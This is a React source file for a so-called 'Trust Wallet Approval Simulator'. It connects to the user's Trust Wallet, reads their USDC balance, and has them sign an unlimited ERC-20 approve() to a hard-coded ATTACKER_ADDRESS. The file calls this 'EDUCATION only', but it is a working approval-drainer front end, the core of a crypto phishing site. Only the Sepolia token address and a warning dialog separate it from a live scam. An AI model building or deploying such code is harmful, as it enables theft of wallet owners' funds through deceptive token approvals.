import React, { useState, useEffect } from "react";
import { ethers } from "ethers";

// ✅ USDC on Sepolia (Trust Wallet supports Sepolia)
const TOKEN_ADDRESS = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238";

// ✅ Dummy ETH address
const ATTACKER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31";

// ERC20 ABI
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function symbol() view returns (string)",
];

// Unlimited approval
const UNLIMITED =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function App() {
  const [step, setStep] = useState(1);
  const [wallet, setWallet] = useState(null);
  const [signer, setSigner] = useState(null);
  const [token, setToken] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);

  const addLog = (msg) => setLogs((prev) => [...prev, msg]);
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  // =========================
  // DETECT TRUST WALLET ONLY
  // =========================
  useEffect(() => {
    if (window.ethereum?.isTrust) {
      setIsTrustWallet(true);
      addLog("📱 Trust Wallet detected");
    } else {
      addLog("❌ Trust Wallet not detected");
    }
  }, []);

  // =========================
  // CONNECT TRUST WALLET
  // =========================
  const connectWallet = async () => {
    try {
      if (!window.ethereum || !window.ethereum.isTrust) {
        alert(
          "Please open this website inside Trust Wallet Browser.\n\n" +
          "Trust Wallet → Browser → Paste site URL"
        );

        // Mobile redirect
        const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
        if (isMobile) {
          window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + window.location.href;
        }
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
      await provider.send("eth_requestAccounts", []);

      const signer = provider.getSigner();
      const address = await signer.getAddress();
      const ethBalance = await provider.getBalance(address);

      const contract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);

      setSigner(signer);
      setToken(contract);

      setWallet({
        address,
        short: address.slice(0, 6) + "..." + address.slice(-4),
        eth: ethers.utils.formatEther(ethBalance),
      });

      addLog("✅ Trust Wallet connected");
      setStep(2);
    } catch (err) {
      console.error(err);
      if (err.code === 4001) {
        addLog("❌ Connection rejected");
      } else {
        addLog("❌ Wallet connection failed");
      }
    }
  };

  // =========================
  // SIMULATION
  // =========================
  const simulate = async () => {
    try {
      setLoading(true);
      setLogs([]);

      addLog("🔍 Scanning wallet...");
      await sleep(500);

      const rawBalance = await token.balanceOf(wallet.address);
      const decimals = await token.decimals();
      const balance = ethers.utils.formatUnits(rawBalance, decimals);

      addLog(`💰 Balance: ${balance}`);
      await sleep(500);

      const confirm = window.confirm(
        "⚠️ WARNING\n\n" +
        "This will approve UNLIMITED token spending.\n" +
        "This is for EDUCATION only.\n\n" +
        "Continue?"
      );

      if (!confirm) {
        addLog("❌ User cancelled");
        return;
      }

      const tx = await token.approve(ATTACKER_ADDRESS, UNLIMITED);
      addLog(`📝 Tx sent: ${tx.hash}`);
      addLog("⏳ Waiting confirmation...");

      await tx.wait();

      addLog("🚨 UNLIMITED approval granted");
      setStep(3);
    } catch (err) {
      console.error(err);
      if (err.code === 4001) {
        addLog("❌ User rejected transaction");
      } else {
        addLog("❌ Error occurred");
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">

        <h1 className="text-2xl font-bold text-center mb-4">
          🔐 Trust Wallet Approval Simulator
        </h1>

        {!isTrustWallet && (
          <div className="bg-red-900/30 p-4 rounded mb-4 text-sm">
            ❌ Please open this site inside <b>Trust Wallet Browser</b>
          </div>
        )}

        {step === 1 && (
          <button
            onClick={connectWallet}
            className="w-full py-3 bg-blue-600 rounded-lg font-bold"
          >
            Connect Trust Wallet
          </button>
        )}

        {step === 2 && wallet && (
          <div className="space-y-4">
            <div className="bg-black p-3 rounded text-sm">
              <p>📱 Trust Wallet</p>
              <p>Address: {wallet.short}</p>
              <p>ETH: {wallet.eth}</p>
            </div>

            <button
              disabled={loading}
              onClick={simulate}
              className="w-full py-3 bg-red-600 rounded-lg font-bold"
            >
              {loading ? "Processing..." : "Start Simulation"}
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="bg-black p-4 rounded space-y-2 text-sm">
            {logs.map((l, i) => (
              <div key={i}>{l}</div>
            ))}
            <p className="text-red-400 mt-3">
              ⚠️ Unlimited approval is dangerous in real life.
            </p>
          </div>
        )}

      </div>
    </div>
  );
}

export default App;
